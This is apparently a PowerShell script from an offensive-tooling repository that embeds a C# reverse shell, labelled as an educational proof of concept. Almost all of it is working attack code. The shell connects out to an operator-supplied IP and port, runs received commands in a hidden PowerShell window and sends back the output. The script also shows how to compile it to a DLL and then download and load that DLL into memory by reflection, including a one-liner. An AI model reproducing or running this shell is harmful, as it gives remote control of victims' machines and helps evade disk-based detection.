<#
  Simple C# based PowerShell reverse shell (SharpShell) that can be loaded into Memory
  ARBITRARY VERSION NUMBER:  1.0.0
  AUTHOR:  Tyler McCann (@tylerdotrar)
  LINK: https://github.com/tylerdotrar/PoorMansArmory


  Notes:
  [+] This script is primarily a PoC intended for educational purposes.
  [+] Usage:  [SharpShell]::Main(@('<ip_address>','<port>'))
#>


# C# based Reverse Shell (SharpShell)
$SharpShell = @"
using System;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
public class SharpShell
{
    public static void Main(string[] args)
    {
        string IpAddress = args[0];
        Int32 Port = int.Parse(args[1]);
        String CommandPrompt = String.Empty;
        String Command;
        try
        {
            TcpClient client = new TcpClient(IpAddress, Port);
            Console.WriteLine("[+] Connected to '{0}' on port {1}", IpAddress, Port);
            while (true)
            {
                NetworkStream stream = client.GetStream();
                CommandPrompt = "SharpShell> ";
                byte[] SendCommandBuffer = Encoding.Default.GetBytes(CommandPrompt);
                stream.Write(SendCommandBuffer, 0, SendCommandBuffer.Length);
                byte[] ReceiveCommandBuffer = new byte[1024];
                int ResponseData = stream.Read(ReceiveCommandBuffer, 0, ReceiveCommandBuffer.Length);
                Array.Resize(ref ReceiveCommandBuffer, ResponseData);
                Command = Encoding.Default.GetString(ReceiveCommandBuffer);
                if (Command == "exit\n")
                {
                    stream.Close();
                    client.Close();
                    break;
                }
                if (Command == "quit\n")
                {
                    stream.Close();
                    client.Close();
                    break;
                }
                Process p = new Process();
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.Arguments = "-Command " + Command;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                String Output = p.StandardOutput.ReadToEnd();
                String Error = p.StandardError.ReadToEnd();
                byte[] OutputBuffer = Encoding.Default.GetBytes(Output);
                byte[] ErrorBuffer = Encoding.Default.GetBytes(Error);
                stream.Write(OutputBuffer, 0, OutputBuffer.Length);
                stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("[-] Error: {0}", e.Message);
            return;
        }
    }
}
"@


### Invocation Option 1: ###
# Load SharpShell into the current session via Add-Type
Add-Type $SharpShell


### Invocation Option 2: ###
# Create a 'SharpShell.dll' to host and reflect remotely
Add-Type $SharpShell -OutputAssembly SharpShell.dll

# Host 'SharpShell.dll' however you want...

# (1/2) Load 'SharpShell.dll' into the current session via .NET reflection
$TargetURL    = 'http(s)://<ip_address>:<port>/SharpShell.dll'
$WebClient    = New-Object -TypeName System.Net.WebClient
$DownloadData = $WebClient.DownloadData($TargetURL)
[System.Reflection.Assembly]::Load($DownloadData)

# (2/2) Load 'SharpShell.dll' into the current session via .NET reflection (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_address>:<port>/SharpShell.dll'))